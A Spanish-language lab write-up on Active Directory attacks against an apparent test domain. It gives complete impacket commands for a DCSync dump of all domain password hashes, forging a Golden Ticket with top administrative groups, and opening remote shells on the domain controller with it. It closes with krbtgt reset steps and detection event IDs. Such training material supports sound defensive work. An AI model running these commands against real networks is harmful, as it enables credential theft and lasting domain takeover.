# Writeup — DCSync y Golden Ticket

**Entorno:** empresa.local  
**Requisito:** Cuenta con privilegios DS-Replication-Get-Changes-All  
**MITRE ATT&CK:** T1003.006 (DCSync) · T1558.001 (Golden Ticket)

---

## Fase 1 — DCSync: Volcar todos los hashes del dominio

DCSync simula ser un Domain Controller legítimo y solicita
replicación de credenciales al DC real. No requiere acceso
físico al servidor ni ejecutar código en él.

### Prerrequisito — Verificar acceso

```bash
crackmapexec smb 192.168.1.10 -u Administrador -p "Admin123!" -d empresa.local
```

### Ejecutar DCSync

```bash
# Volcar solo hashes NTLM (más limpio)
impacket-secretsdump empresa.local/Administrador:"Admin123!"@192.168.1.10 \
    -just-dc-ntlm

# Resultado esperado:
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# Administrador:500:aad3b435b51404eeaad3b435b51404ee:HASH_DA:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:HASH_KRBTGT:::
# juan.garcia:1103:aad3b435b51404eeaad3b435b51404ee:HASH_JUAN:::
# svc-sql:1104:aad3b435b51404eeaad3b435b51404ee:HASH_SVC:::
# maria.lopez:1105:aad3b435b51404eeaad3b435b51404ee:HASH_MARIA:::

# Solo el krbtgt (para Golden Ticket)
impacket-secretsdump empresa.local/Administrador:"Admin123!"@192.168.1.10 \
    -just-dc-user krbtgt
```

### Guardar los hashes

```bash
impacket-secretsdump empresa.local/Administrador:"Admin123!"@192.168.1.10 \
    -just-dc-ntlm -outputfile /tmp/dcsync_hashes

# Los hashes quedan en:
# /tmp/dcsync_hashes.ntds
```

---

## Fase 2 — Golden Ticket: Acceso permanente al dominio

Con el hash de `krbtgt` podemos forjar tickets Kerberos para
cualquier usuario con cualquier privilegio.

### Obtener el SID del dominio

```bash
# El SID aparece en el output de secretsdump
# O con este comando:
impacket-getPac empresa.local/juan.garcia:"Password123!"@192.168.1.10

# Formato: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
```

### Crear el Golden Ticket

```bash
impacket-ticketer \
    -nthash <HASH_KRBTGT> \
    -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
    -domain empresa.local \
    -user "Constan" \
    -groups 512,513,518,519,520 \
    golden_ticket

# Grupos incluidos:
# 512 = Domain Admins
# 513 = Domain Users
# 518 = Schema Admins
# 519 = Enterprise Admins
# 520 = Group Policy Creator Owners
```

### Usar el Golden Ticket

```bash
# Cargar el ticket en la sesión
export KRB5CCNAME=golden_ticket.ccache

# Verificar
klist

# Acceder al DC como Domain Admin
impacket-psexec -k -no-pass empresa.local/Constan@DC01.empresa.local

# Shell remota
impacket-wmiexec -k -no-pass empresa.local/Constan@DC01.empresa.local

# Acceso SMB
impacket-smbclient -k -no-pass empresa.local/Constan@DC01.empresa.local
```

---

## Resumen del Kill Chain completo

```
[juan.garcia]
     │
     ├──► Kerberoasting ──────────────► svc-sql:Password123!
     │
     ├──► AS-REP Roasting ────────────► maria.lopez:Password123!
     │
     └──► [Administrador] (acceso directo o escalada)
               │
               ├──► DCSync ───────────► hash krbtgt + todos los NTLM
               │
               └──► Golden Ticket ───► Acceso permanente como cualquier usuario
                                        Válido 10 años
                                        Sobrevive cambio de contraseñas de DA
```

---

## Neutralización (Blue Team)

El Golden Ticket solo se neutraliza así:

```powershell
# En el DC — cambiar la contraseña de krbtgt DOS VECES
# con al menos 10 horas de diferencia entre cada cambio
Set-ADAccountPassword -Identity krbtgt \
    -NewPassword (ConvertTo-SecureString "NuevaPass1!" -AsPlainText -Force)

# Esperar 10 horas...

Set-ADAccountPassword -Identity krbtgt \
    -NewPassword (ConvertTo-SecureString "NuevaPass2!" -AsPlainText -Force)
```

---

## Detección

| Ataque | Event ID | Qué buscar |
|--------|----------|------------|
| DCSync | 4662 | Acceso con GUID de replicación desde IP no-DC |
| Golden Ticket | 4769 | Tickets con tiempo de vida > 10h o usuario no existente |
| Ambos | 4672 | Privilegios especiales asignados a sesión |
